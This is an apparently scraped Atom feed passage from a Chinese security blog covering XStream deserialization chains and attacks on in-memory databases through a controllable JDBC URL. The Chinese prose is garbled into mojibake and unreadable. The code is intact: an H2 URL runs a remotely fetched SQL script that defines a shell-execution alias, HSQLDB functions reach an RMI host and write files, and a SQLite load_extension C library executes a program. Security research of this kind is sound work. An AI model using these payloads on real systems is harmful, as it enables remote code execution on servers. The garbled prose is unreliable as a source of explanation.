ImageIO$ContainsFilter</h5><p>è¿™ä¸ªé“¾æ¯”è¾ƒé•¿ï¼Œæ€è·¯æ¥æºæ˜¯marshalsecçš„ImageIO gadgetï¼Œé€†å‘å‘ç°çš„ç¡®å¾ˆéš¾ï¼ŒWh1t3p1gå¸ˆå‚…ä¹Ÿæ˜¯ä»æ­£å‘å»è·Ÿè¸ªçš„ã€‚</p><p>æ­£å‘çš„å¤ç°å¸ˆå‚…æ–‡ç« é‡Œä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œä¸èµ˜è¿°äº†ã€‚</p><h5 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h5><p>è¿™ä¸ªé“¾çš„æ€è·¯æœ€æ—©ã€4ã€‘ä¸­orich1å¸ˆå‚…çš„å‘ç°ï¼Œè¿‡ç¨‹ä¹Ÿæ¯”è¾ƒé•¿ï¼Œé‡ç‚¹æ˜¯ä»BCELè§¦å‘ï¼Œå¯»æ‰¾å¯ç”¨çš„lass.ForName()åˆ©ç”¨ç‚¹ï¼ŒIterator.nextè¿™é‡Œå¼€å§‹é€†å‘å‘ç°æ–°çš„é“¾ã€‚Wh1t3p1gå¸ˆå‚…çš„å®ç°BCELä¹Ÿå¾ˆæœ‰äº®ç‚¹ï¼Œå¾ˆå€¼å¾—å­¦ä¹ ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚ç®€è¦ä»‹ç»äº†XStreamçš„åºåˆ—åŒ–&amp;ååºåˆ—åŒ–çš„å®ç°åŸç†ã€‚javaååºåˆ—åŒ–ï¼Œç±»å¿…é¡»è¦å¯Serializableï¼Œä½†æ˜¯åœ¨XStreamä¸Šï¼Œå¹¶ä¸æ˜¯å¿…é¡»ã€‚é’ˆå¯¹éSeriablzableçš„ç±»ï¼ŒXStreamå¼•å…¥äº†å¤šç§Conveterå®ç°è¿™ä¸€è¿‡ç¨‹ã€‚</p><p>å…¶ä¸­EventHandler å’ŒGroovy ConvertedClosure éƒ½æ˜¯åˆ©ç”¨åˆ°äº†TreeSetConveter &amp; DynamicProxyConverterï¼ŒGroovy Expandoåˆ©ç”¨åˆ°äº†MapConverterã€‚</p><p>é—ç•™é—®é¢˜ï¼š</p><ol><li>gadget 4å’Œ5è¿˜éœ€è¦å†å•ç‹¬åˆ†æåˆ†æï¼ŒWh1t3p1gå¸ˆå‚…çš„ysomapè¿˜æœ‰å‡ ä¸ªgadgetï¼Œä¹Ÿéœ€è¦å†å•ç‹¬å­¦ä¹ å­¦ä¹ å§¿åŠ¿ã€‚</li><li>BCEL è¿™ç§é€šç”¨çš„åˆ©ç”¨æ‰‹æ³•æ€è·¯ï¼Œæœ‰æ²¡æœ‰å…¶ä»–çš„APPã€‚</li><li>XStream åç»­çš„å‡ ä¸ªCVE</li><li>XStream çš„é»‘åå•å®‰å…¨æ‰‹æ®µï¼ŒSecurityConveter</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ·±å…¥åˆ†æ</a></li><li>[3] <a href="https://www.jianshu.com/p/387c568faf62">XStream æºç è§£æ</a></li><li>[4] <a href="https://www.anquanke.com/post/id/172198">jenkins 2.101 XStream rce æŒ–æ˜æ€è·¯</a></li><li>[5] <a href="https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/">Jenkins 2.101 XStream Rce[ç©ºæŒ‡é’ˆCTFä¸€æœˆå†…éƒ¨èµ›Writeup]</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;XStream ååºåˆ—åŒ–é—®é¢˜ç”±æ¥å·²ä¹…ï¼Œä»&amp;lt;=1.4.6ç‰ˆæœ¬ä¹‹ä¸‹çš„EventHandleråˆ©ç”¨æ–¹å¼ï¼Œåˆ°20å¹´çš„CVE-2020-26217ï¼Œå†åˆ°21å¹´é’Ÿå¸ˆå‚…ã€threedr3amã€whit3p1gå¸ˆå‚…ä»¬ä¸è¦é’±ä¼¼çš„6ä¸ªCVEã€‚å®ƒçš„æˆå› ä¸åŒäºfastjsonä¹‹ç±»ï¼Œä¹Ÿæœ‰å¼‚äºåŸç”ŸJavaååºåˆ—åŒ–ï¼Œå¾ˆæœ‰ç‰¹ç‚¹ï¼Œå€¼å¾—å­¦ä¹ ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬èŠ‚å…¶å®ç®—æ˜¯Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹çš„å­¦ä¹ ç¬”è®°ï¼Œä¹Ÿè¯•ç€è§£é‡Šå¸ˆå‚…æ²¡æåˆ°çš„ä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;1-XStream-åŸç†è§£æ&quot;&gt;&lt;a href=&quot;#1-XStream-åŸç†è§£æ&quot; class=&quot;headerlink&quot; title=&quot;1. XStream åŸç†è§£æ&quot;&gt;&lt;/a&gt;1. XStream åŸç†è§£æ&lt;/h2&gt;&lt;h3 id=&quot;1-1-æºç è§£æ&quot;&gt;&lt;a href=&quot;#1-1-æºç è§£æ&quot; class=&quot;headerlink&quot; title=&quot;1.1 æºç è§£æ&quot;&gt;&lt;/a&gt;1.1 æºç è§£æ&lt;/h3&gt;&lt;p&gt;å‚è€ƒã€3ã€‘&lt;br&gt;&lt;img src=&quot;/images/pasted-136.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Jdbcç¢ç¢å¿µä¸‰ï¼šå†…å­˜æ•°æ®åº“</title>
    <link href="http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2021-04-26T06:10:00.000Z</published>
    <updated>2021-11-25T05:58:45.255Z</updated>
    
    <content type="html"><![CDATA[<p>ç»§ç»­è®¨è®ºè®¨è®ºåœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œæœ‰å“ªä¸‹æ”»å‡»æ‰‹æ³•ï¼Ÿ</p><ol><li>æ”»å‡»clientæ€è·¯ï¼Œå…¸å‹çš„å°±æ˜¯mysql clientï¼Œå‰é¢è®²è¿‡</li><li>æ”»å‡»serveræ€è·¯ï¼Œå†…å­˜æ•°æ®åº“å°±æ˜¯å½“å‰serverï¼Œå‘ç°ç›¸å…³ä»‹ç»æ–‡ç« éƒ½æ¯”è¾ƒæ•£ï¼Œè¿™é‡Œå°è¯•æ¢ç´¢æ€»ç»“ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘ç°æ–°çš„å§¿åŠ¿</li></ol><h1 id="æ”»å‡»å†…å­˜æ•°æ®åº“Server"><a href="#æ”»å‡»å†…å­˜æ•°æ®åº“Server" class="headerlink" title="æ”»å‡»å†…å­˜æ•°æ®åº“Server"></a>æ”»å‡»å†…å­˜æ•°æ®åº“Server</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>h2_exec.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;open -a calculator.app&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>python -m SimpleHTTPServer 3333</code></p><p>è§¦å‘ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:3333/h2_exec.sql&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection con = DriverManager.getConnection(url);</span><br><span class="line">&#125;<span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-133.png" alt="upload successful"></p><p>tips: <code>java -cp h2.jar org.h2.tools.Server</code>å¯ä»¥å¼€å¯web console server</p><h2 id="HSQLDB"><a href="#HSQLDB" class="headerlink" title="HSQLDB"></a>HSQLDB</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hsqldb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hsqldb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨hsqldb HTTP Server</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.server.WebServer --database.0 file:mydb --dbname.0 xdb</span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">&gt; java -cp hsqldb-2.5.1.jar org.hsqldb.util.DatabaseManagerSwing</span><br></pre></td></tr></table></figure><p>æµ…è“å¤§ä½¬å…³äºHSQLDBçš„æ€»ç»“ç®—æ˜¯è§åˆ°æœ€å…¨é¢çš„ç›¸å…³æ–‡ç« äº†ï¼Œè¯¦æƒ…å‚è€ƒã€5ã€‘ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæ–¹æ³•&amp;ç»“è®º</p><h3 id="1-åˆ©ç”¨call-java-static-function"><a href="#1-åˆ©ç”¨call-java-static-function" class="headerlink" title="1. åˆ©ç”¨call java static function"></a>1. åˆ©ç”¨call java static function</h3><p>åˆ©ç”¨hsqldb create function/procedureå¯ç›´æ¥è°ƒç”¨Javaé™æ€æ–¹æ³•ï¼Œä¾‹å¦‚</p><ul><li>rmi åˆ©ç”¨<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> rce(<span class="built_in">VARCHAR</span>(<span class="number">80</span>))</span><br><span class="line">    <span class="keyword">returns</span> <span class="built_in">VARCHAR</span>(<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">no</span> <span class="keyword">sql</span></span><br><span class="line">    <span class="keyword">language</span> <span class="keyword">java</span></span><br><span class="line">    <span class="keyword">external</span> <span class="keyword">name</span> <span class="string">&#x27;CLASSPATH:java.rmi.Naming.list&#x27;</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">CALL</span> rce(<span class="string">&#x27;rmi://127.0.0.1:2333/a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li>å†™æ–‡ä»¶<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> writeBytesToFilename(<span class="keyword">IN</span> paramString <span class="built_in">VARCHAR</span>(<span class="number">1024</span>), <span class="keyword">IN</span> paramArrayOfByte VARBINARY(<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">JAVA</span></span><br><span class="line"><span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> <span class="string">&#x27;CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;</span><br><span class="line"><span class="keyword">call</span> writeBytesToFilename(<span class="string">&#x27;/tmp/hsql111&#x27;</span>, <span class="keyword">cast</span> (<span class="string">&#x27;313131313131&#x27;</span> <span class="keyword">AS</span> VARBINARY(<span class="number">1024</span>)));</span><br></pre></td></tr></table></figure></li></ul><p>ä½†æ˜¯åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦</p><ol><li>å¯æ§jdbc URL</li><li>å¯è‡ªå®šä¹‰æ‰§è¡Œsqlï¼Œå»call javaé™æ€æ–¹æ³•</li></ol><h3 id="2-åˆ©ç”¨ååºåˆ—åŒ–"><a href="#2-åˆ©ç”¨ååºåˆ—åŒ–" class="headerlink" title="2. åˆ©ç”¨ååºåˆ—åŒ–"></a>2. åˆ©ç”¨ååºåˆ—åŒ–</h3><p>èµä¸€ä¸ªæµ…è“å¤§ä½¬çš„æ–‡ç« å‚è€ƒã€5ã€‘ï¼Œhsqlç ”ç©¶æ–‡ç« æŒºå°‘çš„ï¼Œæµ…è“å¤§ä½¬æ€»ç»“å¾ˆåˆ°ä½ã€‚<br>è§¦å‘ç‚¹æœ‰ä¸¤ä¸ª</p><ol><li>JDBCResultSetï¼Œè·å–sqlè¿è¡Œç»“æœçš„æ—¶å€™ï¼ŒgetObjectè§¦å‘</li><li>JDBCCallableStatementï¼Œé¢„ç¼–è¯‘é˜¶æ®µï¼ŒæŒ‡å®šOTHERç±»å‹å‚æ•°æ—¶å¯ä»¥è§¦å‘</li></ol><p>æµ…è“ç”¨åˆ°çš„demoæ˜¯2ï¼Œ1çš„demoå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line">String dburl = <span class="string">&quot;jdbc:hsqldb:http://127.0.0.1/xdb&quot;</span>;</span><br><span class="line">Connection connection = DriverManager.getConnection(dburl, <span class="string">&quot;sa&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">Statement stmt = connection.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;SELECT * FROM \&quot;PUBLIC\&quot;.\&quot;MOVIES\&quot;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿›ä¸€æ­¥è‡ªåŠ¨åŒ–æˆç±»ä¼¼mysql fake serverï¼Œæ”»å‡»clientï¼Œä¸è¿‡è§¦å‘ä¹Ÿæ˜¯å¾ˆé¸¡è‚‹äº†</p><ol><li>å¯æ§jdbc URL</li><li>éœ€è¦client execteQueryå¹¶ä¸” getObject</li></ol><p>é¡ºå¸¦æåˆ°ä¸‹å‚è€ƒã€7ã€‘ä¸­çš„CVE-2020-5902 F5 big-ipçš„è¿™ä¸ªæ¼æ´ï¼Œè°ƒè¯•æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œè¿˜æœ‰å®½å­—èŠ‚é‡åˆ°çš„è¿™ä¸ªcaseï¼Œå‚è€ƒã€8ã€‘</p><h2 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.13.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ldap å’Œcall åº”è¯¥ä¼šæœ‰é—®é¢˜<br>To Be Continuedâ€¦</p><h2 id="SQlite"><a href="#SQlite" class="headerlink" title="SQlite"></a>SQlite</h2><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.16.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2021/11/25æ–°å¢<br>ç»“åˆpyn3rdçš„hitb çš„PPTï¼ŒURLå¯æ§ä¸”SQLå¯æ§æƒ…å†µä¸‹ï¼Œå¯ä»¥å®ç°RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadExtension</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    Connection connection = DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:http://127.0.0.1:8888/poc2.db?enable_load_extension=true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connection.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    Statement statement = connection.createStatement();</span><br><span class="line">    statement.execute(<span class="string">&quot;SELECT load_extension(&#x27;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/sqlite-jdbc-tmp-264346288.db&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    statement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -fPIC -shared sq2.c -o sq2.dylib</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  sqlite3 *db, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">char</span> **pzErrMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> *argv[]=&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execv(<span class="string">&quot;/usr/bin/open&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚æ¢è®¨äº†ä¸‹åœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œå› ä¸ºå†…å­˜æ•°æ®åº“Server&amp;Clientå°±æ˜¯å½“å‰åŒä¸€å°æœºå™¨ï¼Œå¯»æ‰¾å†…å­˜æ•°æ®åº“çš„åˆ©ç”¨ç‚¹ã€‚æ€è·¯æœ‰ä¸¤ç‚¹ï¼š</p><ul><li>åˆ©ç”¨æ•°æ®åº“ç‰¹æ€§ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤/å†™æ–‡ä»¶ï¼Œåœ¨Serverä¸ŠRCE</li><li>åˆ©ç”¨ååºåˆ—åŒ–ï¼Œæ„é€ æ¶æ„Serverï¼Œåœ¨Clientä¸ŠRCE</li></ul><p>ç›®å‰é™¤äº†H2ï¼Œå…¶ä»–è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://kbase.ayoma.me/databases/">Security Knowledge Base/ Databases</a></li><li>[2] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[3] <a href="https://www.anquanke.com/post/id/210849">F5 BIG-IP hsqldbï¼ˆCVE-2020-5902ï¼‰æ¼æ´è¸©å‘åˆ†æ</a></li><li>[4] <a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902">Proof of Concept for CVE-2020-5902</a></li><li>[5] <a href="https://xz.aliyun.com/t/9162">HSQLDB å®‰å…¨æµ‹è¯•æŒ‡å—ï¼ˆæµ…è“å¤§ä½¬ï¼‰</a></li><li>[6] <a href="http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html">Chapter 14. Properties</a></li><li>[7] <a href="https://cert.360.cn/report/detail?id=55654da3c33b4c832167a8902f14cd4f">CVE-2020-5902: F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</a></li><li>[8] <a href="https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg">javaæ¶æ„æ ·æœ¬è°ƒè¯•æŒ‡å—</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»§ç»­è®¨è®ºè®¨è®ºåœ¨jdbc urlå¯æ§æƒ…å†µä¸‹ï¼Œæœ‰å“ªä¸‹æ”»å‡»æ‰‹æ³•ï¼Ÿ&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ”»å‡»clientæ€è·¯ï¼Œå…¸å‹çš„å°±æ˜¯mysql clientï¼Œå‰é¢è®²è¿‡&lt;/li&gt;
&lt;li&gt;æ”»å‡»serveræ€è·¯ï¼Œå†…å­˜æ•°æ®åº“å°±æ˜¯å½“å‰serverï¼Œå‘ç°ç›¸å…³ä»‹ç»æ–‡ç« éƒ½æ¯”è¾ƒæ•£ï¼Œè¿™é‡Œå°è¯•æ¢ç´¢æ€»ç»“ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘ç°æ–°çš„å§¿åŠ¿&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot;&gt;&lt;a href=&quot;#æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot; class=&quot;headerlink&quot; title=&quot;æ”»å‡»å†…å­˜æ•°æ®åº“Server&quot;&gt;&lt;/a&gt;æ”»å‡»å†…å­˜æ•°æ®åº“Server&lt;/h1&gt;&lt;h2 id=&quot;H2&quot;&gt;&lt;a href=&quot;#H2&quot; class=&quot;headerlink&quot; title=&quot;H2&quot;&gt;&lt;/a&gt;H2&lt;/h2&gt;&lt;p&gt;pomä¾èµ–&lt;/p&gt;
